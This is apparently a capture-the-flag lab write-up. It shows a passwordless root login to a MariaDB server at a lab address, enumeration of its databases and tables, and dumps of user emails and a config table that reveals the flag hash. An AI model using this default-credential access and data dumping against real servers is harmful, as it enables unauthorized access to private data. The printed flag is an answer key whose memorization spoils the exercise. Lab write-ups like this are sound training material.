On our scan we find 1 port open, 3306, and its running mySQL 
The community that developed this version is MariaDB

Lets try and login with some default credentials.

```php
mysql -h 10.129.155.162 -u root
```

It takes root without any password, and were in

```php
Your MySQL connection id is 170
Server version: 5.5.5-10.3.27-MariaDB-0+deb10u1 Debian 10
```

Lets poke around and see what we can find

```php
SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

Lets select the `htb` database and see all of its tables

```php
USE htb;
SHOW TABLES;

+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

Okay lets grab everything from users 

```php
SELECT * FROM users;

+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
```

Okay, lets check config to be sure

```php
SELECT * FROM config;

+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
```

We have found our root flag `7b4bec00d1a39e3dd4e021ec3d915da8`
